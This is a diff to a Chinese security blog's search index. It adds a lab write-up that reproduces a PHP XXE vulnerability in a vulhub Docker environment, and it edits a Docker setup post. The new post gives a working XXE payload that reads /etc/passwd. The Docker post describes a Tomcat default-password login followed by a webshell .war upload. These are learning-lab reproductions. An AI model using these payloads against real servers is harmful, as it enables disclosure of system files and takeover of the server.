@@ -4,6 +4,41 @@
   
     
     <entry>
+      <title>PHP XML外部实体注入漏洞(XXE)复现</title>
+      <link href="/2022/05/05/php-xxe/"/>
+      <url>/2022/05/05/php-xxe/</url>
+      
+        <content type="html"><![CDATA[<h1 id="XML外部实体注入漏洞复现"><a href="#XML外部实体注入漏洞复现" class="headerlink" title="XML外部实体注入漏洞复现"></a>XML外部实体注入漏洞复现</h1><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><blockquote><p>PHP 7.0.30</p><p>libxml 2.8.0</p></blockquote><p><code>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞，本例会将libxml2.8.0版本编译进PHP中。PHP版本并不影响XXE利用。</code></p><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/php/php_xxedocker-compose up -d</code></pre><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>先打开网页看看</p><p><img src="/2022/05/05/php-xxe/image-20220505153517058.png" alt="image-20220505153517058"></p><p>访问<code>http://192.168.3.151:8080/index.php</code>能看到phpinfo</p><p>在里面可以看到<code>libxml</code>版本</p><p><img src="/2022/05/05/php-xxe/image-20220505153702980.png" alt="image-20220505153702980"></p><p>Web目录为<code>www</code>，里面有4个文件</p><pre><code>tree .dom.php #使用DOMDocument解析bodyindex.phpSimpleXMLElement.php #使用SimpleXMLElement类解析bodySimplexml_load_string.php #使用simplexml_load_string函数解析body</code></pre><p>构造payload</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> <span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY ></span>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" >]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>打开burpsuite抓取数据包</p><p>然后把这玩意扔进去</p><p><img src="/2022/05/05/php-xxe/image-20220505154735442.png" alt="image-20220505154735442"></p><p>获得<code>/etc/passwd</code>里面的内容</p><p><img src="/2022/05/05/php-xxe/image-20220505154753664.png" alt="image-20220505154753664"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> vulhub </tag>
+            
+            <tag> PHP </tag>
+            
+            <tag> XML </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>flask-ssti注入漏洞复现</title>
       <link href="/2022/05/05/flask-ssti/"/>
       <url>/2022/05/05/flask-ssti/</url>
@@ -820,7 +855,7 @@
       <link href="/2022/04/21/docker/"/>
       <url>/2022/04/21/docker/</url>
       
-        <content type="html"><![CDATA[<h1 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h1><p>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中,然后发布到任何流行的Linux或Windows操作系统的机器上,也可以实现虚拟化,容器是完全使用沙箱机制,相互之间不会有任何接口。</p><p>一个完整的Docker有以下几个部分组成：</p><ol><li>DockerClient客户端</li><li>Docker Daemon守护进程</li><li>Docker Image镜像</li><li>DockerContainer容器</li></ol><h1 id="Linux搭建docker环境"><a href="#Linux搭建docker环境" class="headerlink" title="Linux搭建docker环境"></a>Linux搭建docker环境</h1><h2 id="1-安装docker"><a href="#1-安装docker" class="headerlink" title="1.安装docker"></a>1.安装docker</h2><pre class=" language-Linux"><code class="language-Linux">apt install docker.io</code></pre><p>查看是否安装成功</p><pre class=" language-Linux"><code class="language-Linux">docker --version</code></pre><p><img src="/2022/04/21/docker/image-20220421211900017.png" alt="image-20220421211900017"></p><p>成了</p><p>启动docker服务</p><pre class=" language-Linux"><code class="language-Linux">service docker start</code></pre><p>查看运行状态</p><pre class=" language-Linux"><code class="language-Linux">systemctl status docker</code></pre><p><img src="/2022/04/21/docker/image-20220421212446087.png" alt="image-20220421212446087"></p><h2 id="2-安装docker-compoase"><a href="#2-安装docker-compoase" class="headerlink" title="2.安装docker-compoase"></a>2.安装docker-compoase</h2><p>先安装pip</p><pre class=" language-Linux"><code class="language-Linux">apt install python3-pip</code></pre><p>成功</p><p><img src="/2022/04/21/docker/image-20220421230613435.png" alt="image-20220421230613435"></p><p>然后安装docker-compose</p><pre class=" language-Linux"><code class="language-Linux">apt install docker-compose</code></pre><p><img src="/2022/04/21/docker/image-20220421231700513.png" alt="image-20220421231700513"></p><p>成功</p><h2 id="3-安装vulhub"><a href="#3-安装vulhub" class="headerlink" title="3.安装vulhub"></a>3.安装vulhub</h2><p>git安装</p><pre class=" language-Linux"><code class="language-Linux">git clone https://github.com/vulhub/vulhub.git</code></pre><p>下载好了之后做一下测试</p><p>选取tomcat弱口令漏洞cd到所在目录</p><pre class=" language-Linux"><code class="language-Linux">cd vulhub/tomcat/tomcat8</code></pre><p>建立容器</p><pre class=" language-Linux"><code class="language-Linux">docker-compose build</code></pre><p><img src="/2022/04/21/docker/image-20220422112006964.png" alt="image-20220422112006964"></p><p>启动漏洞环境</p><pre class=" language-Linux"><code class="language-Linux">docker-compose up -d</code></pre><p><img src="/2022/04/21/docker/image-20220422112050870.png" alt="image-20220422112050870"></p><p>下载一下net-tools（可以使用ifconfig查看本机ip）</p><pre class=" language-Linux"><code class="language-Linux">apt-get install net-tools</code></pre><p>查看ip</p><pre class=" language-Linux"><code class="language-Linux">ifconfig</code></pre><p>然后测试一下</p><p>在网页中打开ip:8080</p><p><img src="/2022/04/21/docker/image-20220422112316219.png" alt="image-20220422112316219"></p><p>成功！</p><h1 id="tomcat8弱口令-任意文件上传"><a href="#tomcat8弱口令-任意文件上传" class="headerlink" title="tomcat8弱口令+任意文件上传"></a>tomcat8弱口令+任意文件上传</h1><p>tomcat8的默认账号和密码都是tomcat，我们点击server status进入后台</p><p><img src="/2022/04/21/docker/image-20220422133044531.png" alt="image-20220422133044531"></p><p><img src="/2022/04/21/docker/image-20220422133059843.png" alt="image-20220422133059843"></p><p>点击List Applications</p><p><img src="/2022/04/21/docker/image-20220422133239116.png" alt="image-20220422133239116"></p><p>找到上传点，可以上传.war文件</p><p><img src="/2022/04/21/docker/image-20220422141028122.png" alt="image-20220422141028122"></p><p>ps：</p><blockquote><p>里面是哥斯拉生成的木马</p></blockquote><p>解压war包：jar -xvf xxx.war<br>压缩war包：jar -cvf xxx.war *&#x2F;.</p><p>解压jar包：jar -xvf xxx.jar<br>压缩jar包：jar -cvf xxx.jar*&#x2F; </p><p><strong>上传成功</strong></p><p><img src="/2022/04/21/docker/image-20220422141057705.png" alt="image-20220422141057705"></p><p>测试好不好使</p><p><img src="/2022/04/21/docker/image-20220422144753585.png" alt="image-20220422144753585"></p><p>成了</p>]]></content>
+        <content type="html"><![CDATA[<h1 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h1><p>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中,然后发布到任何流行的Linux或Windows操作系统的机器上,也可以实现虚拟化,容器是完全使用沙箱机制,相互之间不会有任何接口。</p><p>一个完整的Docker有以下几个部分组成：</p><ol><li>DockerClient客户端</li><li>Docker Daemon守护进程</li><li>Docker Image镜像</li><li>DockerContainer容器</li></ol><h1 id="Linux搭建docker环境"><a href="#Linux搭建docker环境" class="headerlink" title="Linux搭建docker环境"></a>Linux搭建docker环境</h1><h2 id="1-安装docker"><a href="#1-安装docker" class="headerlink" title="1.安装docker"></a>1.安装docker</h2><pre class=" language-Linux"><code class="language-Linux">apt install docker.io</code></pre><p>查看是否安装成功</p><pre class=" language-Linux"><code class="language-Linux">docker --version</code></pre><p><img src="/2022/04/21/docker/image-20220421211900017.png" alt="image-20220421211900017"></p><p>成了</p><p>启动docker服务</p><pre class=" language-Linux"><code class="language-Linux">service docker start</code></pre><p>查看运行状态</p><pre class=" language-Linux"><code class="language-Linux">systemctl status docker</code></pre><p><img src="/2022/04/21/docker/image-20220421212446087.png" alt="image-20220421212446087"></p><h2 id="2-安装docker-compoase"><a href="#2-安装docker-compoase" class="headerlink" title="2.安装docker-compoase"></a>2.安装docker-compoase</h2><p>先安装pip</p><pre class=" language-Linux"><code class="language-Linux">apt install python3-pip</code></pre><p>成功</p><p><img src="/2022/04/21/docker/image-20220421230613435.png" alt="image-20220421230613435"></p><p>然后安装docker-compose</p><pre class=" language-Linux"><code class="language-Linux">apt install docker-compose</code></pre><p><img src="/2022/04/21/docker/image-20220421231700513.png" alt="image-20220421231700513"></p><p>成功</p><h2 id="3-设置国内镜像"><a href="#3-设置国内镜像" class="headerlink" title="3.设置国内镜像"></a>3.设置国内镜像</h2><pre class=" language-Linux"><code class="language-Linux">sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json <<-'EOF'&#123;  "registry-mirrors": ["https://l10nt4hq.mirror.aliyuncs.com"]&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart docker</code></pre><h2 id="4-安装vulhub"><a href="#4-安装vulhub" class="headerlink" title="4.安装vulhub"></a>4.安装vulhub</h2><p>git安装</p><pre class=" language-Linux"><code class="language-Linux">git clone https://github.com/vulhub/vulhub.git</code></pre><p>下载好了之后做一下测试</p><p>选取tomcat弱口令漏洞cd到所在目录</p><pre class=" language-Linux"><code class="language-Linux">cd vulhub/tomcat/tomcat8</code></pre><p>建立容器</p><pre class=" language-Linux"><code class="language-Linux">docker-compose build</code></pre><p><img src="/2022/04/21/docker/image-20220422112006964.png" alt="image-20220422112006964"></p><p>启动漏洞环境</p><pre class=" language-Linux"><code class="language-Linux">docker-compose up -d</code></pre><p><img src="/2022/04/21/docker/image-20220422112050870.png" alt="image-20220422112050870"></p><p>下载一下net-tools（可以使用ifconfig查看本机ip）</p><pre class=" language-Linux"><code class="language-Linux">apt-get install net-tools</code></pre><p>查看ip</p><pre class=" language-Linux"><code class="language-Linux">ifconfig</code></pre><p>然后测试一下</p><p>在网页中打开ip:8080</p><p><img src="/2022/04/21/docker/image-20220422112316219.png" alt="image-20220422112316219"></p><p>成功！</p><h1 id="tomcat8弱口令-任意文件上传"><a href="#tomcat8弱口令-任意文件上传" class="headerlink" title="tomcat8弱口令+任意文件上传"></a>tomcat8弱口令+任意文件上传</h1><p>tomcat8的默认账号和密码都是tomcat，我们点击server status进入后台</p><p><img src="/2022/04/21/docker/image-20220422133044531.png" alt="image-20220422133044531"></p><p><img src="/2022/04/21/docker/image-20220422133059843.png" alt="image-20220422133059843"></p><p>点击List Applications</p><p><img src="/2022/04/21/docker/image-20220422133239116.png" alt="image-20220422133239116"></p><p>找到上传点，可以上传.war文件</p><p><img src="/2022/04/21/docker/image-20220422141028122.png" alt="image-20220422141028122"></p><p>ps：</p><blockquote><p>里面是哥斯拉生成的木马</p></blockquote><p>解压war包：jar -xvf xxx.war<br>压缩war包：jar -cvf xxx.war *&#x2F;.</p><p>解压jar包：jar -xvf xxx.jar<br>压缩jar包：jar -cvf xxx.jar*&#x2F; </p><p><strong>上传成功</strong></p><p><img src="/2022/04/21/docker/image-20220422141057705.png" alt="image-20220422141057705"></p><p>测试好不好使</p><p><img src="/2022/04/21/docker/image-20220422144753585.png" alt="image-20220422144753585"></p><p>成了</p>]]></content>
       
       
       <categories>
@@ -1630,11 +1665,11 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 木马 </tag>
             
             <tag> msf </tag>
+            
+            <tag> 工具使用 </tag>
             
             <tag> 免杀 </tag>
             
@@ -1690,9 +1725,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> windows </tag>
+            
+            <tag> 工具使用 </tag>
             
         </tags>
       
@@ -1721,9 +1756,9 @@
             
             <tag> Linux </tag>
             
-            <tag> 操作系统 </tag>
-            
             <tag> 工具使用 </tag>
+            
+            <tag> 操作系统 </tag>
             
         </tags>
       
@@ -2045,11 +2080,11 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 内网渗透 </tag>
             
             <tag> msf </tag>
+            
+            <tag> 工具使用 </tag>
             
             <tag> cs </tag>
             
@@ -2078,9 +2113,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 内网渗透 </tag>
+            
+            <tag> 工具使用 </tag>
             
             <tag> cs </tag>
             
@@ -2109,9 +2144,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 内网渗透 </tag>
+            
+            <tag> 工具使用 </tag>
             
             <tag> cs </tag>
             
@@ -2140,9 +2175,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 内网渗透 </tag>
+            
+            <tag> 工具使用 </tag>
             
             <tag> cs </tag>
             
@@ -2171,9 +2206,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 内网渗透 </tag>
+            
+            <tag> 工具使用 </tag>
             
             <tag> cs </tag>
             
@@ -2202,9 +2237,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 内网渗透 </tag>
+            
+            <tag> 工具使用 </tag>
             
             <tag> cs </tag>
             
@@ -2233,9 +2268,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 内网渗透 </tag>
+            
+            <tag> 工具使用 </tag>
             
             <tag> cs </tag>
             
@@ -2264,9 +2299,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 内网渗透 </tag>
+            
+            <tag> 工具使用 </tag>
             
             <tag> cs </tag>
             
@@ -2295,9 +2330,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 工具使用 </tag>
-            
             <tag> 内网渗透 </tag>
+            
+            <tag> 工具使用 </tag>
             
             <tag> cs </tag>
             
